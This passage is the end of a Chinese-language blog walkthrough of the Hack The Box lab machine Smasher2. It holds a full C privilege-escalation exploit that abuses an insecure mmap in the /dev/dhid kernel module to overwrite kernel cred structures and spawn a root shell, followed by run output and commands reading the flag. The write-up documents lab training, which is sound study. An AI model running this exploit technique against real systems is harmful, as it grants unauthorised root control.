class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        return-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>x0);</span><br><span class="line">    if (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(&quot;Failed to mmap: &quot;);</span><br><span class="line">        close(fd);</span><br><span class="line">        return-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;[+] mmap OK addr: %x\n&quot;, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    printf(&quot;[+] UID: %d\n&quot;, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = <span class="number">0</span>;</span><br><span class="line">    unsigned int credNum = <span class="number">0</span>;</span><br><span class="line">    while (((unsigned long)addr) &lt; (mmapStart + size -<span class="number">0</span>x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        &#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line"></span><br><span class="line">            credIt = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getuid() == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                puts(<span class="string">&quot;[+] GOT ROOT!&quot;</span>);</span><br><span class="line"></span><br><span class="line">                credIt += 1; //skip 4 bytes to get to caps</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line"></span><br><span class="line">                execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-&quot;</span>, (char *)NULL);</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                credIt = 0;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在像以前一样编译，然后运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp4.c -o exp4</span><br><span class="line">exp4.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp4.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %<span class="built_in">ls</span></span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp4</span><br><span class="line">[+] PID: 2019</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a98844, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99204, credNum: 5</span><br><span class="line">[+] GOT ROOT!</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功获取root权限，现在读取flag并提交,帅到飞天。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">CREDITS.txt  root.txt</span><br><span class="line"><span class="comment"># cat CREDITS.txt</span></span><br><span class="line">SMASHER2 by dzonerzy@htb <span class="keyword">in</span> collaboration with xg0@htb have fun and be ready <span class="keyword">for</span> smasher3!</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">7791e0e************************</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb11.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb12.jpg"></p>
<p>知识点总结：</p>
<ul>
<li>身份验证绕过</li>
<li>RCE与WAF绕过</li>
<li>不安全mmap程序实现的内核模块(该模块允许用户访问内核内存)</li>
</ul>
<p>最后演示一下性感大佬在线删除靶机，删自己的靶机，让别人无靶机可打，小盆友请勿模仿，太黄太暴力过程就不演示了！！！;)</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb13.jpg"></p>
<p>嗯，，，已经删到残废了。。。</p>
<p><font color="red">Game over</font></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2019/12/26/Smasher2/" title="Hack-The-Box-walkthrough[Smasher2]">https://fdlucifer.github.io/2019/12/26/Smasher2/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2019/12/24/sunset-sunrise/" rel="prev" title="vulnhub靶机渗透[sunset-sunrise]">
                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[sunset-sunrise]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2019/12/29/pWnOS-1/" rel="next" title="vulnhub靶机渗透[pWnOS-1.0]">
                  vulnhub靶机渗透[pWnOS-1.0] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">630k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:09</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
